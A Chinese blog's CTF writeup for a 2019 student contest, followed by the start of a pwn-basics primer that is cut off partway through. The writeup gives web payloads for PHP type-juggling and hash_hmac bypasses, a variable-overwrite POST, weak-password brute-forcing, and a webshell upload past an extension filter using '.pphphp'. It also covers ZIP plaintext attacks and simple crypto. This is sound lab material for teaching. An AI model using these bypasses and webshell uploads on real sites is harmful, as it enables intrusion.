class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGxTYmtwT1ZtMW9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowedXV0doVlYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedVYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedVYmtwT1ZtMW9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedTV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGRPVldScFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGxTYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedUV0docFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldSWVYwZG9WVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowed&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklUm1SWVYwZG9WVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGxTYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldSWVYwZG9WVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowedXV0doVlYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUblJXYTFwUFZsZFNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">asdfiohaefho;</span><br><span class="line">$_ &#x3D; preg_replace(&quot;&#x2F;c#%bbuh;!_&amp;%ls@asc%bbzfd&#x2F;s&quot;, &#39;p&#39;, $_);</span><br><span class="line">$_ &#x3D; preg_replace(&quot;&#x2F;lhuh;!_&amp;%l@das%dbuioowed&#x2F;s&quot;, &#39;h&#39;, $_);</span><br><span class="line">$_ &#x3D; preg_replace(&quot;&#x2F;&amp;\)buh;!_&amp;%l@as%bagsdepkl&#x2F;s&quot;, &#39;p&#39;, $_);</span><br><span class="line">$__ &#x3D; explode(&quot;\n&quot;, $_);</span><br><span class="line">echo count($__);</span><br><span class="line">foreach ($__ as $____ &#x3D;&gt; $_____) </span><br><span class="line">    &#123;</span><br><span class="line">        for($_qpalzmxncbvsjdhfgryeuwi&#x3D;0;$_qpalzmxncbvsjdhfgryeuwi&lt;10;$_qpalzmxncbvsjdhfgryeuwi++)</span><br><span class="line">        &#123;$_____ &#x3D; base64_decode($_____);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>看到好像还是很乱很多，其实仔细一看也挺简单的，就是对一大串字符串处理</p><p>本地测试一下让它输出变量试试，发现只有放到下图这样才会输出少量东西，其它好像都不太像flag</p><p><img src="/2019/08/15/drops-new-2019/20190810182541.png"></p><p>这个像不像常见的置换密码，试了试是ROT13加密</p><pre><code>flag&#123;php_is_the_best_language&#125;</code></pre><h3 id="Hi-WALLE"><a href="#Hi-WALLE" class="headerlink" title="Hi~WALLE"></a>Hi~WALLE</h3><p>拿到题目是这样的：</p><p><img src="/2019/08/15/drops-new-2019/20190810183622.png"></p><p>dirseach一扫，发现<code>robots.txt</code></p><p>访问一看，有个隐藏目录，<code>/easy_challenge/web/dropsec/shell</code></p><p>访问隐藏目录，提示flag不在这里</p><p>用工具再扫一下这个目录吧，有个<code>shell.php</code>,访问出现点我有惊喜提示，方向好像对了，再点开，最坑爹的地方来了，也是这个地方让我知道为啥有代打出题人业务了，一把心酸泪啊</p><p><img src="/2019/08/15/drops-new-2019/20190810184641.png"></p><p>仔细观察，发现有什么不同没？</p><p><code>dr0psec</code> <code>drOpsec</code></p><p>一个是0，一个是O,它让我们传一个参数，刚开始一直是Url上那个参数，一直没进展</p><p>换成dr0psec随便输个1，发现提示<code>too small</code>,输个10000 提示<code>too big</code></p><p>很明显bp爆破就行，当=2333时有flag</p><pre><code>flag&#123;l0ve_walle_robots&#125;</code></pre><h3 id="easy-audit1"><a href="#easy-audit1" class="headerlink" title="easy audit1"></a>easy audit1</h3><p>拿到题目是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if(empty($_GET)) </span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(&quot;get get get get args&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$a1&#x3D;$_GET[&#39;a1&#39;];</span><br><span class="line">$a2&#x3D;$_GET[&#39;a2&#39;];</span><br><span class="line">$a3&#x3D;$_GET[&#39;a3&#39;];</span><br><span class="line">$a4&#x3D;$_GET[&#39;a4&#39;];</span><br><span class="line">$obstacle_1&#x3D;is_numeric($a2) and is_numeric($a1);</span><br><span class="line">if(!$obstacle_1) exit(&quot;foolish&quot;);</span><br><span class="line"></span><br><span class="line">if(!(intval($a2)&lt;1024 and intval($a2+1)&gt;1024)) exit(&quot;emmmmm&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($a1))</span><br><span class="line">&#123;</span><br><span class="line">    $secret&#x3D;hash_hmac(&#39;sha256&#39;,$a1,$secret);</span><br><span class="line">&#125;</span><br><span class="line">$hmac&#x3D;hash_hmac(sha256,$a2,$secret);</span><br><span class="line">if($a3!&#x3D;&#x3D;$hmac)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    die(&quot;OMG&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;give you flag: &quot;.$flag;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">get get get get args</span><br></pre></td></tr></table></figure><p>显然是一道代码审计题，我们要做的就是怎样绕过</p><p>观察题目发现可以传4个参数，GET方式</p><p>并且a1,a2要为数字</p><p>如果有两个is_numeric判断的时候用and连接起来，and后面的is_numberic判断可忽略</p><p>还要<code>intval($a2)&lt;1024 and intval($a2+1)&gt;1024</code>，这里的intval() 函数用于获取变量的整数值，可以用16进制或者科学记数法进行绕过</p><p>intval(字符串)为0，intval(字符串+1) 会自动转换成数值的，事实上是字符串和数字运算时发生了转换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a2&#x3D;&#39;1e9&#39;;</span><br><span class="line">echo intval($a2);#输出1</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo intval($a2+1);#输出100000001</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo $a2+1;#输出100000001</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>hash_hmac()函数是生成带有密钥的哈希值，有三个参数，如果传入加密的字符串为数组，函数将返回空字符串，就可以通过控制a1的值，我们可以让$secret为空，那么$hmac就可以控制了</p><p>cmd本地测试一下算下$a2用sha256算法加密后的结果，这里$a2取1e5,注意$a2要为字符串类型，即加上单引号或双引号</p><pre><code>e6f66665054a43d574b8c3fb1599d6cbbc8760191d270428f2213b000f16b7e6</code></pre><p><img src="/2019/08/15/drops-new-2019/20190812224837.png"></p><pre><code>payload1:?a1[]=1&amp;a2=1e5&amp;a3=e6f66665054a43d574b8c3fb1599d6cbbc8760191d270428f2213b000f16b7e6</code></pre><p>当然a1也可以不为数组</p><pre><code>payload2:?a1=1&amp;a2=1e5&amp;a3=4dd2fa37e9fe33eccec13b3adcfc9c0d86e074c8e369d9d9d9db00a2c0c75ca3flag&#123;didhfahffdjhcj38ash8y&#125;</code></pre><h3 id="easy-audit2"><a href="#easy-audit2" class="headerlink" title="easy audit2"></a>easy audit2</h3><p>打开题目又是道代码审计题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#39;flag.php&#39;);</span><br><span class="line">$flag &#x3D; &#39;xxxxxxxxxxxxxx&#39;;</span><br><span class="line">foreach ($_POST as $key &#x3D;&gt; $value) &#123;</span><br><span class="line">    $a &#x3D; $value;</span><br><span class="line">    $$$key&#x3D;$value;</span><br><span class="line">    $ccut &#x3D; $flag;</span><br><span class="line">    $yml &#x3D; $_GET[&quot;flag&quot;];</span><br><span class="line">    if ($yml &#x3D;&#x3D; &quot;iwantflag&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($ccut &#x3D;&#x3D; &quot;flag&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            echo $fl4g;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;you will get it&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;nonono&quot;;</span><br><span class="line">    &#125;    </span><br><span class="line">    # code...</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);   </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>仔细看看，这道题的意思就是把POST过来的数组键值遍历，GET接收一个flag的参数</p><p>输出flag的方式就是让GET方式提交的参数flag为<code>’iwantflag’</code>，$ccut为’flag’,而<code>$ccut = $flag</code>,所以就转变成让<code>$flag=’flag’</code>的问题了，这里我也不绕弯了，首先要了解php可变变量的概念,具体百度</p><p><img src="/2019/08/15/drops-new-2019/20190812233048.png"></p><p>payload：</p><pre><code>GET:?flag=iwantflagPOST:a=flag解释一下，当POST过去a=flag时$key=’a’,$value=’flag’,又因为$a = $value，则$a=’flag’,$$$key=$$a=$flag=$value=’flag’,构造成功flag&#123;Varivables-are-covered-MX&#125;</code></pre><h3 id="loginlogin"><a href="#loginlogin" class="headerlink" title="loginlogin"></a>loginlogin</h3><p>拿到题目是个登录界面：</p><p><img src="/2019/08/15/drops-new-2019/20190812233404.png"></p><p>bp抓包，看到这个提示，意思是说初始账号密码分别为<code>dropsec_admin</code>，<code>123456</code></p><p><img src="/2019/08/15/drops-new-2019/20190812233631.png"></p><p>尝试用这个登陆，发现根本没反应，由此我们想可能是个假的登陆页面，dirsearch扫下吧，发现了<code>login.php</code>,访问一下，是个GET方式的登陆，感觉好low，尝试用默认账号密码登陆，提示<code>login failed</code>，bp爆破一下弱口令吧,管理员账号应该不会改，这里选择password这个字典</p><p><img src="/2019/08/15/drops-new-2019/20190812234618.png"></p><p>密码为ADMIN</p><p><img src="/2019/08/15/drops-new-2019/20190812234732.png"></p><p>登陆进去发现好像又变成考察文件上传了，并且提示只能上传jpg文件</p><p>先上传个一句话试试，bp抓下包，改下MIME(Content-Type)</p><p><img src="/2019/08/15/drops-new-2019/20190813000235.png"></p><p>发现提示：服务器把php扩展名替换成空了</p><p><img src="/2019/08/15/drops-new-2019/20190813000357.png"></p><p>我们想到双写绕过，直接再bp里改，注意php双写绕过只有<code>.pphphp</code>一种方式</p><p><img src="/2019/08/15/drops-new-2019/20190813000739.png"></p><pre><code>flag&#123;dont_do_things_carelessly&#125;</code></pre><h3 id="ji-ni-tai-mei"><a href="#ji-ni-tai-mei" class="headerlink" title="ji ni tai mei!"></a>ji ni tai mei!</h3><p>发现上次新生赛的题还没删除，就写一下wp吧</p><p>打开题目是这样的</p><p><img src="/2019/08/15/drops-new-2019/20190813145734.png"></p><p>bp抓包看下吧，好像没什么提示，dirseach扫下，发现有个index.php,但是跳转到flag1.php了，再抓包来看下吧</p><p><img src="/2019/08/15/drops-new-2019/20190813150033.png"></p><p>发现提示：<code>flag200.php</code>，访问下发现还是和<code>flag1.php</code>一样，试着k，发现就403了，而200之前的好像都存在，bp爆破一下吧</p><p><img src="/2019/08/15/drops-new-2019/20190813150447.png"></p><p><code>flag157.php</code>的长度显然不同，看下响应头，flag到手</p><pre><code>flag&#123;really_beaut1ful~&#125;</code></pre><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="The-Wonderful-Wizard"><a href="#The-Wonderful-Wizard" class="headerlink" title="The Wonderful Wizard"></a>The Wonderful Wizard</h3><p>Stegsolve打开，切换一下，可以看到flag,是16进制的转成字符就行</p><h3 id="easy-image"><a href="#easy-image" class="headerlink" title="easy image"></a>easy image</h3><p>扫描二维码</p><h3 id="神奇的压缩包"><a href="#神奇的压缩包" class="headerlink" title="神奇的压缩包"></a>神奇的压缩包</h3><p>本题源自bugku杂项神秘的文件，做题方法是明文攻击</p><p>解压题目，发现有flag.zip和logo.png两个文件，并且flag.zip是加密的，里面有也有两个文件，一个docx文件和logo.png</p><p><img src="/2019/08/15/drops-new-2019/20190809225716.png"></p><p>这时我们想到了明文攻击，将logo.png添加到压缩文件，然后就用到ARCHPR了，注意，请注意CRC一定要相同才能用ARCHPR明文攻击，否则会报错(第二张图)：</p><p><img src="/2019/08/15/drops-new-2019/20190809230550.png"></p><p><img src="/2019/08/15/drops-new-2019/20190809230834.png"></p><p>爆破结果出来</p><p><img src="/2019/08/15/drops-new-2019/20190809231341.png"></p><p>输入口令解压，将docx文件拖到虚拟机binwalk分离一下，得到flag.txt,base64解码得到flag</p><p><img src="/2019/08/15/drops-new-2019/20190809231906.png"></p><pre><code>flag&#123;d0cX_1s_ziP_file&#125;</code></pre><h3 id="放松一下"><a href="#放松一下" class="headerlink" title="放松一下"></a>放松一下</h3><p>摩斯电码</p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h3><p>用uncompyle6反编译.py文件，改下源码</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><p>ascci码转字符</p><h3 id="Alphabet"><a href="#Alphabet" class="headerlink" title="Alphabet"></a>Alphabet</h3><p>百度一下是字母表的意思，打开之后是这样的：</p><p><img src="/2019/08/15/drops-new-2019/20190810175851.png"></p><p>我们可以想到前面的Alphabet应该不是加密的内容，然后后面跟了一串字符串，可以看到有{}这两个符号，前面一串是大写字母，后面是小写子母，并且{前的小写字母刚好是四个，大写字母刚为26个</p><p>不扯了，这题的解法就是前面的26大写字母，分别对应着字母表的26个字母，我们要做的就是找到后面的一串小写字母在前面大写字母的序号，和真实的字母表一一对应就可以得到flag,奉上解密脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tr&#x3D;&quot;WCGPSUHRAQYKFDLZOJNXMVEBT&quot;</span><br><span class="line">secert&#x3D;&quot;ukwh&#123;ljwdhsqmags&#125;&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for s in secert:</span><br><span class="line">    if s!&#x3D;&quot;&#123;&quot; and s!&#x3D;&quot;&#125;&quot;:</span><br><span class="line">        num&#x3D;tr.index(s.upper())</span><br><span class="line">        flag+&#x3D;chr(num+ord(&quot;a&quot;))</span><br><span class="line">    else:</span><br><span class="line">        flag+&#x3D;s</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>flag也奉上</p><pre><code>flag&#123;orangejuice&#125;</code></pre><h3 id="富强民主"><a href="#富强民主" class="headerlink" title="富强民主"></a>富强民主</h3><p>社会主义核心价值观解码</p><h3 id="baby’s-baby-rsa"><a href="#baby’s-baby-rsa" class="headerlink" title="baby’s baby rsa"></a>baby’s baby rsa</h3><pre><code>M=Cd%n</code></pre><p>套公式</p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn入门基本知识</title>
      <link href="2019/07/22/pwn-base/"/>
      <url>2019/07/22/pwn-base/</url>
      
        <content type="html"><![CDATA[<p>本篇博客记录了学习pwn入门的一些东西，包括一些常见概念和常见漏洞及利用方法</p><a id="more"></a><h2 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h2><h3 id="文件段："><a href="#文件段：" class="headerlink" title="文件段："></a>文件段：</h3><pre><code>bss段：（未手动初始化的数据）并不给该段的数据分配空间，只是记录数据所需空间的大小data段：（已手动初始化的数据）段则为数据分配空间，数据保存在目标文件中text段：代码段（code segment/text segment）通常是指用来存放程序执行代码的一块内存区域。这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读(某些架构也允许代码段为可写，即允许修改程序)。在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等堆（heap）：堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）栈(stack)：栈又称堆栈，是用户存放程序临时创建的局部变量，也就是说我们函数括弧“&#123;&#125;”中定义的变量（但不包括static声明的变量，static意味着在数据段中存放变量）。除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。由于栈的先进先出(FIFO)特点，所以栈特别方便用来保存/恢复调用现场。</code></pre><h3 id="常见寄存器"><a href="#常见寄存器" class="headerlink" title="常见寄存器"></a>常见寄存器</h3><pre><code>esp:用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化ebp:用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置eip:用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令</code></pre><h2 id="函数调用时栈的变化"><a href="#函数调用时栈的变化" class="headerlink" title="函数调用时栈的变化"></a>函数调用时栈的变化</h2><ol><li><p>首先将被调用函数的参数按照逆序依次压入栈内，没有参数则没有这一步</p></li><li><p>将被调用函数的返回地址压入栈内</p></li><li><p>将调用函数的基地址（ebp）压入栈内，并将当前栈顶地址传到 ebp 寄存器内</p></li><li><p>将被调用函数的局部变量压入栈内</p></li><li><p>将被调用函数的局部变量弹出栈外</p></li><li><p>将调用函数的基地址（ebp）弹出栈外，并存到 ebp 寄存器内</p></li><li><p>将被调用函数的返回地址弹出栈外，并存到 eip 寄存器内</p></li></ol><h2 id="GOT和PLT表"><a href="#GOT和PLT表" class="headerlink" title="GOT和PLT表"></a>GOT和PLT表</h2><p>GOT 全称是全局偏移量表（Global Offset Table），用来存储外部函数在内存的确切地址。GOT 存储在数据段（Data Segment）内，可以在程序运行中被修改。PLT 全称是程序链接表（Procedure Linkage Table），用来存储外部函数的入口点（entry），换言之程序总会到 PLT 这里寻找外部函数的地址。PLT 存储在代码段（Code Segment）内，在运行之前就已经确定并且不会被修改，所以 PLT 并不会知道程序运行时动态链接库被加载的确切位置。PLT 表内存储的入口点就是 GOT 表中对应条目的地址。</p><h2 id="程序的保护机制"><a href="#程序的保护机制" class="headerlink" title="程序的保护机制"></a>程序的保护机制</h2><h3 id="CANNARY-栈保护"><a href="#CANNARY-栈保护" class="headerlink" title="CANNARY(栈保护)"></a>CANNARY(栈保护)</h3><p>这个选项表示栈保护功能有没有开启。<br>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p><h3 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h3><p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。<br>内存地址随机化机制（address space layout randomization)，有以下三种情况:</p><pre><code>0 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。</code></pre><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p><h3 id="NX（DEP）-数据执行保护-Data-Execution-Prevention"><a href="#NX（DEP）-数据执行保护-Data-Execution-Prevention" class="headerlink" title="NX（DEP）(数据执行保护 Data Execution Prevention)"></a>NX（DEP）(数据执行保护 Data Execution 